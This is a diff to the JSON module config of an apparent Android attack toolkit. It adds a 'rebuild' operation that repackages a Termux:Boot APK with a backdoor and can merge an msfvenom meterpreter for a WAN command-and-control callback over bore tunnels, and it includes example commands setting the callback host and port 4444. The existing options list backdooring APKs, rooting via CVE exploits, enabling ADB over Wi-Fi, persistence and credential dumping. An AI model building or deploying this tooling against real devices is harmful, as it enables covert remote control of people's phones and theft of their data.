@@ -32,7 +32,7 @@
         "options": [
           "recon", "app_scan", "vuln_scan", "exploit", "network", "forensics", "full",
           "frida_hook", "objection_patch",
-          "backdoor_apk", "deploy_shell",
+          "backdoor_apk", "rebuild", "deploy_shell",
           "adb_wifi", "get_root", "exploit_cve", "cve_chain", "zero_click",
           "persist", "hook", "unhook",
           "device_net_scan",
@@ -52,6 +52,7 @@
           "frida_hook     — Deploy frida-server, SSL unpin, root bypass, dump creds, trace",
           "objection_patch — Embed Frida gadget via Objection (no root at runtime)",
           "backdoor_apk   — Pull APK, inject msfvenom payload (-x template), sign, reinstall",
+          "rebuild        — Rebuild Termux:Boot backdoor APK via build_bootbuddy.py (proven WAN C2)",
           "deploy_shell   — Generate fresh msfvenom APK and install via adb",
           "adb_wifi       — Enable ADB over TCP/WiFi (adb tcpip 5555)",
           "get_root       — Multi-vector root: Magisk/su, adb root, CVE-2024-0044, mtk-su, KernelSU",
@@ -288,6 +289,30 @@
         "type": "boolean",
         "required": false,
         "default": false
+      },
+      "apk_path": {
+        "description": "Path to original Termux:Boot APK for rebuild operation (auto-pulled from device if omitted)",
+        "type": "string",
+        "required": false,
+        "default": ""
+      },
+      "out_path": {
+        "description": "Output APK path for rebuild operation (default: apk_backdoor/output/rebuilt.apk)",
+        "type": "string",
+        "required": false,
+        "default": ""
+      },
+      "msf": {
+        "description": "Merge msfvenom meterpreter into APK during rebuild (WAN C2 via bore tunnels)",
+        "type": "boolean",
+        "required": false,
+        "default": false
+      },
+      "msf_lport": {
+        "description": "Meterpreter callback port for rebuild --msf mode",
+        "type": "integer",
+        "required": false,
+        "default": 4444
       }
     },
     
@@ -366,6 +391,17 @@
           "set lhost 192.168.1.42",
           "set lport 8888",
           "run no_device"
+        ]
+      },
+      {
+        "description": "Rebuild Termux:Boot backdoor APK with WAN meterpreter (proven)",
+        "commands": [
+          "use android_pentest",
+          "set operation rebuild",
+          "set lhost auto",
+          "set msf true",
+          "set msf_lport 4444",
+          "run device"
         ]
       },
       {
